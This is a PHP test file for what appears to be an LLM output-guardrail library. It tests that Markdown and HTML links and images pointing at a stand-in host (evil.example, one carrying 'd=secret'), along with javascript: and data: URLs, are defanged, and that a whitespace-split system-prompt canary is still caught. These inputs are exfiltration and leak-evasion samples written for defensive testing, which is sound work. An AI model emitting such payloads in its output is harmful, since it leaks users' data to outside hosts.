<?php

declare(strict_types=1);

use Sellinnate\Warden\Enums\Direction;
use Sellinnate\Warden\Policies\Policy;
use Sellinnate\Warden\Scanners\FormatScanner;
use Sellinnate\Warden\Scanners\MarkdownDefangScanner;
use Sellinnate\Warden\Scanners\OutputLeakScanner;
use Sellinnate\Warden\Support\ScanContext;

function defangCtx(string $text): ScanContext
{
    $c = ScanContext::for(Direction::Output, $text, new Policy('t'));
    $c->normalized = $text;

    return $c;
}

function defang(string $text, array $allowed = []): string
{
    $c = defangCtx($text);
    (new MarkdownDefangScanner($allowed))->scan($c);

    return $c->current;
}

describe('markdown defang bypasses (Phase 2 review)', function () {
    it('H1 — defangs protocol-relative image URLs', function () {
        expect(defang('![x](//evil.example/track.png?d=secret)'))->not->toContain('evil.example');
    });

    it('H2 — defangs reference-style image/link definitions', function () {
        $out = defang("![x][1]\n\n[1]: http://evil.example/a.png");
        expect($out)->not->toContain('evil.example/a.png');
    });

    it('H3 — defangs raw HTML img and anchor tags', function () {
        expect(defang('<img src="http://evil.example/a.png">'))->not->toContain('evil.example');
        expect(defang('<a href="http://evil.example/track">click</a>'))->not->toContain('evil.example/track');
    });

    it('H3 — defangs angle-bracket autolinks', function () {
        expect(defang('<http://evil.example/track>'))->not->toContain('http://evil.example');
    });

    it('M4 — handles escaped closing brackets in alt text', function () {
        expect(defang('![a\\]b](http://evil.example/a.png)'))->not->toContain('evil.example');
    });

    it('does not over-defang same-origin relative links', function () {
        expect(defang('[docs](/local/page)'))->toContain('/local/page');
    });

    it('defangs non-http schemes (data:, javascript:)', function () {
        expect(defang('[x](javascript:alert)'))->toBe('x')
            ->and(defang('[y](data:text/html,abc)'))->toBe('y');
    });
});

describe('canary despace evasion (M7)', function () {
    it('catches a canary the model split with whitespace', function () {
        $c = defangCtx('the token is WARDEN CANARY 7f3a here');
        $result = (new OutputLeakScanner('WARDENCANARY7f3a'))->scan($c);
        expect($result->valid)->toBeFalse();
    });
});

describe('format scalar root (L8)', function () {
    it('rejects a bare scalar when JSON is required', function () {
        $c = defangCtx('42');
        expect((new FormatScanner(true))->scan($c)->valid)->toBeFalse();
    });

    it('accepts an object root', function () {
        $c = defangCtx('{"x":1}');
        expect((new FormatScanner(true))->scan($c)->valid)->toBeTrue();
    });
});
